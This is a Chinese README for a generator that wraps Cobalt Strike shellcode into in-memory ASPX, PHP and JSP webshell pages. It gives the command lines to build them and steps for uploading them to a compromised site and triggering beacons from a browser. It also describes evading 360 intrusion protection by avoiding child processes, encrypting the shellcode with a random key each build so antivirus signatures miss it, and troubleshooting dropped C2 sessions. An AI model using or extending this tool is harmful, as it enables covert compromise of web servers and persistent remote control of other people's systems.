# CS 载荷内存马 生成器（ASPX / PHP / JSP）

> 只做内存马（不产生新进程、不经 cmd）。**exe 路线已移除** —— 实测在装有 360「Web 服务器入侵防护」的目标上，
> 只要网站进程派生出新进程（哪怕是 cmd）就会被拦，exe 拿不到会话；把执行搬进站点进程内部才通。

## 开箱即用（只需 Python，无需任何编译链）

```bat
:: 双击，按提示选 1/2/3 并输入 aaa.c 路径
make.bat

:: 命令行
python make_beacon.py --aspx --shellcode aaa.c                    :: .NET / IIS
python make_beacon.py --php  --shellcode aaa.c                    :: php-cgi / php-fpm
python make_beacon.py --jsp  --shellcode aaa.c                    :: Tomcat / Java
```

## 推荐用法：每人用自己从 CS 导出的 .c（不用改 IP/端口）

CS 导出 stager 时，已把 C2 的 host/port **以及整套 profile（URI/UA/Referer/心跳）和 stager 加密密钥**都编进 .c 里了。
所以**让每个使用者各自从自己的监听器导出 aaa.c，直接丢进本工具即可**，不需要填 --host/--port。

\--host/--port\ 只用于两种复用场景：① 同一监听器换了 IP 想复用旧载荷；② 手上只有别人的 .c。
注意：工具只能改**明文主机名**和**端口立即数**，**改不了 URI/UA/profile** —— 换监听器时若 profile 不一致，照样连不上（表现为无会话或短会话）。
## 三种载体的前置条件与返回

| 载体 | 运行进程 | 前置条件 | 页面返回 |
|---|---|---|---|
| `--aspx` | `w3wp.exe`（IIS） | 无（.NET 自带 P/Invoke） | `ok`（已实测上线稳定） |
| `--php` | `php-cgi` / `php-fpm` | PHP ≥ 7.4 且 php.ini 里 `ffi.enable=1` | `ok` / `no-ffi` / `e1` / `decrypt-fail` |
| `--jsp` | `java.exe`（Tomcat） | classpath 中有 **JNA**（`com.sun.jna`） | `ok` / `no-jna` / `e1` / `decrypt-fail` |

判据不是语言，而是**站点进程能否直接调用本机 API**（`VirtualAlloc` → 写入 → 改 RX → `CreateThread`）。
经典 ASP（`.asp`）无法直接调 API，只能换站点。

## 投放（关键：不要走 webshell 的命令行）

1. 用蚁剑/其他管理工具的【**文件管理**】把生成的 `mem.aspx` / `mem.php` / `mem.jsp` 上传到网站目录；
2. **用浏览器访问** `http://<目标>/mem.aspx`（或 .php / .jsp）；
3. 页面出现 `ok` → 已在站点进程内执行；去 CS 看会话（进程应为上表对应进程）；
4. ⚠️ **该页面每次访问都会新起一条 beacon**，用完**手动删除**（属于持久化入口）。

> 用 webshell 终端 `copy`/`dir` 之类命令一样会派生 cmd，可能触发行入侵防护——投放尽量只用文件管理 + 浏览器。

## 加密与隐蔽（生成器自带自检）

- 载荷 **Speck64/128-CTR + 位置相关 XOR** 双层加密；落地的文件里只有密文（aspx 用字节数组、php 用 base64、jsp 用 hex），**没有明文 shellcode**；
- 密钥不在文件里明文出现：以掩码混淆数组存放，运行时反推；
- 每份产物在生成期都会：反推密钥 → 解密 → 与原文逐字节比对，不一致直接中止；
- 每次生成随机密钥 → 产物哈希不同（签名被追时可重新生成）。

## C2 配置：工具不改，由 CS 导出时决定

工具**不提供** IP/端口参数。CS 导出 stager/beacon 时已把 host、port、**profile（URI/UA/Referer/心跳）**
和 stager 密钥全部编进 .c，直接用即可。

要换 C2：在 CS 里换/改监听器，**重新导出 .c** 再生成 —— 这样 URI/UA/profile 会同步；
只改 IP 而不换 profile，会出现"IP 对了但连不上（无会话或短会话）"。

## 目录

| 文件 | 作用 |

| `make_beacon.py` | 主脚本（三种载体的生成入口 + IP/端口改写 + 自检） |
| `templates.py` | 三种语言的内存马模板（ASPX / PHP / JSP） |

| `目标清理清单.md` | 目标机上需手动清除的文件与持久化项 |

## 常见问题

| 现象 | 原因 / 处理 |
|---|---|
| 页面返回 `no-ffi` | PHP 没开 FFI：在 php.ini 打开 `extension=ffi` 与 `ffi.enable=1`，或换 ASPX 载体 |
| 页面返回 `no-jna` | Tomcat 的 classpath 里没有 JNA：换 ASPX/PHP 载体，或自备 jna.jar（放 `WEB-INF/lib`） |
| 页面报编译错误 / 500 | 把错误原文发出来即可（模板按最小依赖写的，基本只可能是载体语言版本差异） |
| 弹"未知程序请求联网" | 那不是查杀，是安全软件的联网提示，允许即可 |
| 上线后没过多久掉线 | 换 C2 端口/协议（例如 443 + 域名伪装），或检查目标到 C2 的路由/防火墙 |

## 三条路线（各自的前置条件与处置）

同一个目标只需挑一条；三条都要求「**在站点进程内执行**」（不产生新进程、不经 cmd）。

| 路线 | 站点 | 执行进程 | 前置条件 | 投放 | 前置不满足时 |
|---|---|---|---|---|---|
| ASPX | IIS + ASP.NET | `w3wp.exe` | 无（.NET 自带 P/Invoke） | 上传 `mem.aspx` → 浏览器访问 | 站点主语言是 PHP 也没关系：只要装了 ASP.NET，**同目录放 .aspx 照样能用**（IIS 按扩展名映射处理程序）。验证：访问不存在的 `xxx.aspx`，出现 ASP.NET 错误页即可 |
| PHP | PHP（IIS FastCGI / php-fpm） | `php-cgi.exe` / `php-fpm` | PHP ≥ 7.4 且 `extension=ffi` + `ffi.enable=1` | 上传 `mem.php` → 浏览器访问 | 返回 `no-ffi`：改 php.ini 两行并重启站点/进程池；改不了就换 ASPX（若可用） |
| JSP | Tomcat / Jetty | `java.exe` | classpath 有 **JNA**（`com.sun.jna`） | 上传 `mem.jsp` → 浏览器访问 | 返回 `no-jna`：把 `jna.jar` 放进 `WEB-INF/lib` 后重启应用 |

**先探测再动手**：`python probe.py --all` 生成三个探测页，丢到目标站点访问，看三行即可定路线：

- `route=` 页面类型
- `pinvoke=ok / fail / exception` 是否真能调到 VirtualAlloc（**硬指标**，只看配置不够）
- `verdict=` 直接给结论
